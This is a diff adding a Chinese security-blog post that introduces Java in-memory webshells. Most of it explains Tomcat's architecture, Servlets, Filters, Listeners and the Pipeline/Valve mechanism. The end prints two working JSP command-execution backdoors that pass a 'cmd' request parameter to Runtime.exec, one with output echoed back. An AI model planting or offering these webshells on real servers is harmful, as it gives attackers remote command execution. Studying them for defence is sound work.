@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Java 内存马第一篇 - 基础 | xvsf</title>
+<meta name="keywords" content="java安全, 内存马">
+<meta name="description" content="Java 内存马第一篇 - 基础">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/xvsf/posts_backup/java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%80%E7%AF%87---%E5%9F%BA%E7%A1%80/">
+<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/xvsf/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/xvsf/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/xvsf/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/xvsf/posts_backup/java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%80%E7%AF%87---%E5%9F%BA%E7%A1%80/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Java 内存马第一篇 - 基础
+    </h1>
+    <div class="post-description">
+      Java 内存马第一篇 - 基础
+    </div>
+    <div class="post-meta"><span title='2025-11-08 15:00:00 +0000 UTC'>November 8, 2025</span>&nbsp;·&nbsp;<span>5 min</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="java-内存马第一篇---基础">Java 内存马第一篇 - 基础<a hidden class="anchor" aria-hidden="true" href="#java-内存马第一篇---基础">#</a></h1>
+<h1 id="一基础">一、基础：<a hidden class="anchor" aria-hidden="true" href="#一基础">#</a></h1>
+<h2 id="1-什么是内存马">1. 什么是内存马<a hidden class="anchor" aria-hidden="true" href="#1-什么是内存马">#</a></h2>
+<p>无文件的 webshell</p>
+<blockquote>
+<p><!-- raw HTML omitted -->内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识<!-- raw HTML omitted --><!-- raw HTML omitted -->别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。<!-- raw HTML omitted --></p>
+</blockquote>
+<h2 id="2-内存马分类">2. 内存马分类：<a hidden class="anchor" aria-hidden="true" href="#2-内存马分类">#</a></h2>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506693.png"></p>
+<h2 id="3-tomcat-基础">3. Tomcat 基础<a hidden class="anchor" aria-hidden="true" href="#3-tomcat-基础">#</a></h2>
+<h3 id="31-tomcat-架构">3.1 Tomcat 架构<a hidden class="anchor" aria-hidden="true" href="#31-tomcat-架构">#</a></h3>
+<h4 id="311-tomcat-架构">3.1.1 Tomcat 架构<a hidden class="anchor" aria-hidden="true" href="#311-tomcat-架构">#</a></h4>
+<p><strong><!-- raw HTML omitted -->Tomcat 是Web应用服务器,是一个Servlet/JSP容器<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->，基本框架如下图所示，主要有server、service、connector、container。<!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508073.jpeg"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506316.jpeg"></p>
+<p><strong>Server：</strong></p>
+<p>代表整个 Tomcat 服务器。</p>
+<p>一个 Tomcat 只有一个 Server，Server 中包含至少一个 Service 组件。</p>
+<p><strong>Service：</strong></p>
+<p>Service 主要是为了关联 Connector 和 Container，同时会初始化它下面的其它组件，在 Connector 和 Container 外面多包一层，把它们组装在一起，向外面提供服务，</p>
+<p>一个 Service 可以设置多个 Connector，但只能有一个 Container 容器。</p>
+<p><strong>Connector：</strong></p>
+<p>Connector 负责接收浏览器发过来的 tcp 连接请求，创建一个 Request 和 Response 对象分别用于和请求端交换数据，然后会产生一个线程来处理这个请求并把产生的 Request 和 Response 对象传给处理这个请求的线程。这里Tomcat中一个Connector对应了一个请求，所以service容器中可以同时有多个connector对象。</p>
+<p>简单来说就是Connector将在某个指定的端口上来监听客户的请求，将 socket 连接封装成 request 和 response 对象，后续交给 Container （Engine）来处理，并从Engine处获得响应并返回给客户端。<br>
+<img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508086.jpeg"></p>
+<p>Connector是使用protocolHandler来处理具体的请求（不同的protocolHandler代表不同的连接类型）。</p>
+<p>而每种protocolHandler都使用了各自的3个重要组件来具体处理请求：</p>
+<p>-Endpoint：用于处理底层Socket连接（nio和nio2实现的是TCP/IP协议，Apr实现的是SSL/TLS协议）；</p>
+<p>-Processer：用于将Endpoint接收到的Socket封装成Request（实现HTTP协议或websocket协议或AJP协议）；</p>
+<p>-Adapter：用于将封装好的Request交给Container（将请求适配到servlet容器）。</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507251.jpeg"></p>
+<p><strong><!-- raw HTML omitted -->Container（又名Catalina）：<!-- raw HTML omitted --></strong></p>
+<p><!-- raw HTML omitted -->Container容器则是负责封装和管理Servlet 处理用户的servlet请求，并返回对象给web用户的模块。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->Tomcat中有四种类型的Servlet容器，从上到下分别是 Engine、Host、Context、Wrapper。<!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507920.jpeg"></p>
+<p>Engine：表示整个 Catalina 的 Servlet 引擎，用来管理多个虚拟站点，一个 Service 最多只能有一Engine，但是一个引擎可包含多个 Host；</p>
+<p>Host：代表一个虚拟主机，或者说一个站点，可以给 Tomcat 配置多个虚拟主机地址，而一个虚拟主机下可包含多个 Context；</p>
+<p>Context：表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper；</p>
+<p>Wrapper：表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等</p>
+<h4 id="312-tomcat和servlet的关系"><!-- raw HTML omitted -->3.1.2 Tomcat和Servlet的关系<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#312-tomcat和servlet的关系">#</a></h4>
+<p><strong>Tomcat 是Web应用服务器，是一个Servlet/JSP容器</strong>，而Servlet容器从上到下分别是 Engine、Host、Context、Wrapper。</p>
+<p>Engine：实现类为 org.apache.catalina.core.StandardEngine</p>
+<p>Host：实现类为 org.apache.catalina.core.StandardHost</p>
+<p>Context：实现类为 org.apache.catalina.core.StandardContext</p>
+<p>Wrapper：实现类为 org.apache.catalina.core.StandardWrapper</p>
+<p><!-- raw HTML omitted -->在Tomcat中Wrapper代表一个独立的servlet实例，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化），同时其从ContainerBase类继承过来，表示他是一个容器，只是他是最底层的容器，不能再含有任何的子容器了，且其父容器只能是context。而我们在也就是需要在这里去载入我们自定义的Servlet加载我们的内存马。<!-- raw HTML omitted --></p>
+<h4 id="313-tomcat工作机制动画演示"><!-- raw HTML omitted -->3.1.3 Tomcat工作机制动画演示<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#313-tomcat工作机制动画演示">#</a></h4>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508199.gif"></p>
+<h3 id="32-servlet">3.2 Servlet<a hidden class="anchor" aria-hidden="true" href="#32-servlet">#</a></h3>
+<h4 id="321-什么是servlet"><!-- raw HTML omitted -->3.2.1 什么是servlet<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#321-什么是servlet">#</a></h4>
+<p><!-- raw HTML omitted -->Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。<!-- raw HTML omitted --></p>
+<p><strong><!-- raw HTML omitted -->servlet 架构：<!-- raw HTML omitted --></strong></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508008.jpeg"></p>
+<h4 id="322-请求的处理过程"><!-- raw HTML omitted -->3.2.2 请求的处理过程<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#322-请求的处理过程">#</a></h4>
+<p><!-- raw HTML omitted -->客户端发起一个http请求，比如get类型。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest 和  HttpServletResponse对象。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->Servlet容器调用service()方法。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->doXXX方法中是我们自己写的业务逻辑。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->容器关闭时候，会调用destory方法<!-- raw HTML omitted --></p>
+<h4 id="323-servlet生命周期"><!-- raw HTML omitted -->3.2.3 servlet生命周期<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#323-servlet生命周期">#</a></h4>
+<p><!-- raw HTML omitted -->1）服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(ServletConfig conf)。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->2）servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->3）服务器关闭时，销毁这个servlet对象，执行destroy()方法。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->4）由JVM进行垃圾回收。<!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508795.png"></p>
+<h3 id="33-filter">3.3 Filter<a hidden class="anchor" aria-hidden="true" href="#33-filter">#</a></h3>
+<h4 id="331-简介"><!-- raw HTML omitted -->3.3.1 简介<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#331-简介">#</a></h4>
+<p><!-- raw HTML omitted -->filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。<!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508866.png"></p>
+<h4 id="332-基本工作原理"><!-- raw HTML omitted -->3.3.2 基本工作原理<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#332-基本工作原理">#</a></h4>
+<p><!-- raw HTML omitted -->1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。<!-- raw HTML omitted --></p>
+<h4 id="333-filter的生命周期"><!-- raw HTML omitted -->3.3.3 filter的生命周期<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#333-filter的生命周期">#</a></h4>
+<p><!-- raw HTML omitted -->与servlet一样，Filter的创建和销毁也由web容器负责。web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。 Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。<!-- raw HTML omitted --></p>
+<h4 id="334-filter链"><!-- raw HTML omitted -->3.3.4 filter链 <!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#334-filter链">#</a></h4>
+<p><!-- raw HTML omitted -->当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。<!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508459.png"></p>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3><strong><!-- raw HTML omitted -->3.4 Listener<!-- raw HTML omitted --></strong></h3>
+<h4 id="341-简介"><!-- raw HTML omitted -->3.4.1 简介<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#341-简介">#</a></h4>
+<p><!-- raw HTML omitted -->JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。<!-- raw HTML omitted --></p>
+<p><strong><!-- raw HTML omitted -->ServletContextListener<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：对Servlet上下文的创建和销毁进行监听； <!-- raw HTML omitted --></p>
+<p><strong><!-- raw HTML omitted -->ServletContextAttributeListener<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：监听Servlet上下文属性的添加、删除和替换；<!-- raw HTML omitted --></p>
+<p><strong><!-- raw HTML omitted -->HttpSessionListener<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。<!-- raw HTML omitted --></p>
+<p><strong><!-- raw HTML omitted -->HttpSessionAttributeListener<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：对Session对象中属性的添加、删除和替换进行监听；<!-- raw HTML omitted --></p>
+<p><strong><!-- raw HTML omitted -->ServletRequestListener<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：对请求对象的初始化和销毁进行监听； <!-- raw HTML omitted --></p>
+<p><strong><!-- raw HTML omitted -->ServletRequestAttributeListener<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：对请求对象属性的添加、删除和替换进行监听。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->在应用中可能调用的监听器如下：<!-- raw HTML omitted --></p>
+<ul>
+<li><!-- raw HTML omitted -->ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->ServletRequestListener：对 Request 请求进行监听（创建、销毁）<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听<!-- raw HTML omitted --></li>
+</ul>
+<h4 id="342-用途"><!-- raw HTML omitted -->3.4.2 用途<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#342-用途">#</a></h4>
+<p><!-- raw HTML omitted -->可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。<!-- raw HTML omitted --></p>
+<h3 id="35-tomcat内存马">3.5 Tomcat内存马<a hidden class="anchor" aria-hidden="true" href="#35-tomcat内存马">#</a></h3>
+<p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p>
+<p>而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>tomcat-catalina<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>9.0.105<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><h3 id="36-tomcat-的管道机制">3.6 Tomcat 的管道机制<a hidden class="anchor" aria-hidden="true" href="#36-tomcat-的管道机制">#</a></h3>
+<h4 id="361-tomcat中的管道机制">3.6.1 Tomcat中的<code>管道机制</code><a hidden class="anchor" aria-hidden="true" href="#361-tomcat中的管道机制">#</a></h4>
+<blockquote>
+<p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p>
+<p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508670.png"></p>
+<p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p>
+</blockquote>
+<h4 id="362-管道机制流程分析">3.6.2 管道机制流程分析<a hidden class="anchor" aria-hidden="true" href="#362-管道机制流程分析">#</a></h4>
+<p>我们先来看看Pipeline接口，其继承了Contained接口，并且实现了很多对 Valve 的操作方法</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509796.png"></p>
+<p>跟进查看 Valve 接口：</p>
+<p>其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508325.jpeg"></p>
+<p>同时Valve可以通过重写<code>invoke()</code>方法来实现具体的业务逻辑</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509163.png"></p>
+<p>下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508440.png"></p>
+<p>前面是对Request和Respone对象进行一些判断及创建操作，我们重点来看一下</p>
+<p><code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)</code></p>
+<p>首先通过<code>connector.getService()</code>来获取一个StandardService对象</p>
+<p>接着通过<code>StandardService</code>.<code>getContainer().getPipeline()</code>获取<code>StandardPipeline</code>对象。</p>
+<p>再通过<code>StandardPipeline.getFirst()</code>获取第一个Valve</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508076.png"></p>
+<p>最后通过调用<code>StandardEngineValve.invoke()</code>来实现Valve的各种业务逻辑</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509410.png"></p>
+<p><code>host.getPipeline().getFirst().invoke(request, response)</code>实现调用后续的Valve。</p>
+<h2 id="4-jsp">4. JSP<a hidden class="anchor" aria-hidden="true" href="#4-jsp">#</a></h2>
+<h3 id="41-什么是-jsp">4.1 什么是 JSP：<a hidden class="anchor" aria-hidden="true" href="#41-什么是-jsp">#</a></h3>
+<p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p>
+<p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p>
+<p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p>
+<h3 id="42-恶意类">4.2 恶意类：<a hidden class="anchor" aria-hidden="true" href="#42-恶意类">#</a></h3>
+<h4 id="jsp-的无回显的内存马"><!-- raw HTML omitted -->JSP 的无回显的内存马：<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#jsp-的无回显的内存马">#</a></h4>
+<p>最简单的 JSP 命令执行后门，但是命令执行的输出流（InputStream）未被读取或写回 HTTP 响应所以无回显。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">));</span><span class="o">%&gt;</span><span class="w">
+</span></span></span></code></pre></div><p>改进为带回显：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">in</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">output</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">%&gt;</span><span class="w">
